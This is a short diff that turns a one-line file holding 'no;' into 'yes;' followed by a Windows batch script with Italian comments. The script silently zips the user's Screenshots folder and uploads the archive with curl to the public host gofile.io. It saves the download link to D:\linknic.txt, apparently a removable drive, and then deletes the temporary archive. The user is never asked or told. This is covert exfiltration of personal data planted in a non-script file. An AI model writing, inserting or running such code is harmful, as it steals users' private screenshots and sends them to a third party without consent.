@@ -1,2 +1,41 @@
-no;
+yes;@echo off
+setlocal
+
+:: Percorsi
+set "SRC=%USERPROFILE%\Pictures\Screenshots"
+set "TMPZIP=%TEMP%\screenshots.zip"
+set "DEST=D:\linknic.txt"
+
+:: Verifica se D:\ esiste
+if not exist D:\ exit /b
+
+:: Verifica se la cartella Screenshots esiste
+if not exist "%SRC%" exit /b
+
+:: Crea lo ZIP
+powershell -Command "Compress-Archive -Path '%SRC%\*' -DestinationPath '%TMPZIP%' -Force"
+
+:: Invia a GoFile.io e ottieni il link
+for /f "delims=" %%i in ('curl -s -F "file=@%TMPZIP%" https://gofile.io/uploadFile') do (
+    set "RESPONSE=%%i"
+)
+
+:: Estrai il link dal JSON di risposta
+for /f "tokens=2 delims=:" %%a in ('echo %RESPONSE% ^| findstr "downloadPage"') do (
+    set "LINK=%%~a"
+)
+
+:: Pulisci virgolette e spazi
+set "LINK=%LINK:"=%"
+set "LINK=%LINK:~1,-1%"
+
+:: Se il link è valido, salvalo su D:\linknic.txt
+if defined LINK (
+    echo %LINK% > D:\linknic.txt
+)
+
+:: Pulizia
+del "%TMPZIP%"
+exit /b
+
 
